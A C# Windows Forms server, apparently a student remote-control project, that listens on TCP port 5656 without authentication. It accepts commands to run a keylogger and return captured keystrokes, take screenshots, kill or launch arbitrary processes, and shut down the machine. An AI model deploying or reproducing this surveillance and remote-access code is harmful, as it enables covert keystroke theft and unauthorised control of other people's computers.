using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using Microsoft.Win32;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Threading;
using KeyLogger;

namespace ServerApp
{
    public partial class server : Form
    {
        Thread serverThread; // Luồng chính để chạy Server lắng nghe
        Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI

        public server()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false; // Cho phép truy cập UI từ luồng khác (dùng cẩn thận)
            this.FormClosing += new FormClosingEventHandler(server_FormClosing);

            // Xóa file log cũ khi khởi động lại server để tránh file bị phình to
            try
            {
                if (File.Exists(KeyLogger.appstart.path))
                    File.Delete(KeyLogger.appstart.path);
            }
            catch { }
        }

        // Đảm bảo ngắt toàn bộ tiến trình khi đóng Form
        private void server_FormClosing(object sender, FormClosingEventArgs e)
        {
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }

        // Sự kiện nút "Open Server"
        private void button1_Click(object sender, EventArgs e)
        {
            ((Button)sender).Enabled = false;
            ((Button)sender).Text = "Running...";

            // Chạy server trên một luồng nền (Background Thread)
            serverThread = new Thread(StartServerLoop);
            serverThread.IsBackground = true;
            serverThread.Start();
        }

        // Vòng lặp chính: Lắng nghe kết nối TCP tại Port 5656
        private void StartServerLoop()
        {
            try
            {
                IPEndPoint ip = new IPEndPoint(IPAddress.Any, 5656);
                Program.server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                Program.server.Bind(ip);
                Program.server.Listen(100); // Hàng đợi tối đa 100 kết nối

                while (true)
                {
                    try
                    {
                        // Chấp nhận kết nối từ Client (Python Web Server)
                        Program.client = Program.server.Accept();
                        Program.ns = new NetworkStream(Program.client);
                        Program.nr = new StreamReader(Program.ns);
                        Program.nw = new StreamWriter(Program.ns);
                        Program.nw.AutoFlush = true; // Tự động đẩy dữ liệu đi không cần buffer

                        // Chuyển sang xử lý lệnh
                        HandleClientCommunication();
                    }
                    catch { }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Port 5656 Error: " + ex.Message);
                Environment.Exit(0);
            }
        }

        // Phân tích cú pháp lệnh gửi từ Client
        private void HandleClientCommunication()
        {
            String s = "";
            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "KEYLOG": keylog(); break;     // Chuyển sang xử lý Keylog
                    case "SHUTDOWN": System.Diagnostics.Process.Start("ShutDown", "-s"); break;
                    case "RESTART": System.Diagnostics.Process.Start("shutdown", "/r /t 0"); break;
                    case "TAKEPIC": takepic(); break;   // Chụp màn hình
                    case "PROCESS": process(); break;   // Quản lý tiến trình
                    case "APPLICATION": application(); break; // Quản lý ứng dụng
                    case "QUIT": return; // Ngắt kết nối hiện tại
                }
            }
        }

        // Hàm tiện ích để đọc dòng lệnh an toàn
        public void receiveSignal(ref String s)
        {
            try { s = Program.nr.ReadLine(); if (s == null) s = "QUIT"; }
            catch { s = "QUIT"; }
        }

        // --- MODULE KEYLOGGER ---
        public void keylog()
        {
            KeyLogger.appstart.path = Application.StartupPath + @"\keylog_cache.txt";
            String s = "";

            while (true)
            {
                receiveSignal(ref s);
                switch (s)
                {
                    case "HOOK": // Bắt đầu ghi phím
                        if (tklog == null || !tklog.IsAlive)
                        {
                            tklog = new Thread(new ThreadStart(KeyLogger.InterceptKeys.startKLog));
                            tklog.SetApartmentState(ApartmentState.STA);
                            tklog.Start();
                        }
                        break;

                    case "UNHOOK": // Dừng ghi phím
                        if (tklog != null && tklog.IsAlive)
                        {
                            try { tklog.Abort(); } catch { }
                            tklog = null;
                        }
                        break;

                    case "STATUS": // Kiểm tra trạng thái để hiển thị lên Web
                        bool isRunning = (tklog != null && tklog.IsAlive);
                        Program.nw.WriteLine(isRunning ? "RUNNING" : "STOPPED");
                        Program.nw.Flush();
                        break;

                    case "CLEAR": // Xóa file log
                        try { File.WriteAllText(KeyLogger.appstart.path, ""); } catch { }
                        Program.nw.WriteLine("Logs Cleared");
                        Program.nw.Flush();
                        break;

                    case "PRINT": // Đọc file log gửi về Client
                        String log = "";
                        if (File.Exists(KeyLogger.appstart.path))
                        {
                            try
                            {
                                using (FileStream fs = new FileStream(KeyLogger.appstart.path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                                using (StreamReader sr = new StreamReader(fs))
                                {
                                    log = sr.ReadToEnd();
                                }
                            }
                            catch { log = "Reading..."; }
                        }
                        if (string.IsNullOrEmpty(log)) log = " ";
                        Program.nw.WriteLine(log);
                        Program.nw.Flush();
                        break;

                    case "QUIT": return;
                }
            }
        }

        // --- MODULE SCREENSHOT ---
        public void takepic()
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;
                if (ss == "TAKE")
                {
                    try
                    {
                        // Chụp toàn màn hình
                        Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bmp);
                        g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);

                        // Lưu vào MemoryStream để chuyển thành mảng byte
                        MemoryStream ms = new MemoryStream();
                        bmp.Save(ms, ImageFormat.Bmp);
                        byte[] b = ms.ToArray();

                        // Gửi kích thước ảnh trước, sau đó gửi dữ liệu ảnh
                        Program.nw.WriteLine(b.Length.ToString()); Program.nw.Flush();
                        Program.client.Send(b);
                    }
                    catch { Program.nw.WriteLine("0"); Program.nw.Flush(); }
                }
            }
        }

        // --- MODULE PROCESS & APPLICATION ---
        // Sử dụng chung logic ProcessHandler để giảm lặp code
        public void application() { ProcessHandler("App"); }
        public void process() { ProcessHandler("All"); }

        private void ProcessHandler(string mode)
        {
            String ss = "";
            while (true)
            {
                receiveSignal(ref ss);
                if (ss == "QUIT") return;

                if (ss == "XEM") // Lấy danh sách
                {
                    Process[] pr = Process.GetProcesses();
                    List<Process> filteredList = new List<Process>();
                    foreach (Process p in pr)
                    {
                        // Nếu mode là App thì chỉ lấy cửa sổ có tiêu đề
                        if (mode == "All" || p.MainWindowTitle.Length > 0) filteredList.Add(p);
                    }

                    // Sắp xếp danh sách
                    if (mode == "App") filteredList = filteredList.OrderBy(p => p.MainWindowTitle).ToList();
                    else filteredList = filteredList.OrderBy(p => p.ProcessName).ToList();

                    // Gửi số lượng trước
                    Program.nw.WriteLine(filteredList.Count.ToString()); Program.nw.Flush();

                    // Gửi chi tiết từng Process
                    foreach (Process p in filteredList)
                    {
                        if (mode == "App") Program.nw.WriteLine(p.MainWindowTitle);
                        else Program.nw.WriteLine(p.ProcessName);
                        Program.nw.Flush();
                        Program.nw.WriteLine(p.Id.ToString()); Program.nw.Flush();
                        Program.nw.WriteLine(p.Threads.Count.ToString()); Program.nw.Flush();
                    }
                }
                else if (ss == "KILL") // Diệt tiến trình
                {
                    receiveSignal(ref ss);
                    if (ss == "KILLID")
                    {
                        string id = Program.nr.ReadLine();
                        try
                        {
                            Process p = Process.GetProcessById(int.Parse(id));
                            string pName = (mode == "App") ? p.MainWindowTitle : p.ProcessName;
                            p.Kill();
                            Program.nw.WriteLine($"Successfully killed: {pName} (ID: {id})");
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
                else if (ss == "START") // Mở tiến trình mới
                {
                    receiveSignal(ref ss);
                    if (ss == "STARTID")
                    {
                        string name = Program.nr.ReadLine();
                        try
                        {
                            Process.Start(name);
                            Program.nw.WriteLine("Successfully started: " + name);
                        }
                        catch (Exception ex) { Program.nw.WriteLine("Failed: " + ex.Message.Replace("\n", " ")); }
                        Program.nw.Flush();
                    }
                }
            }
        }
    }
}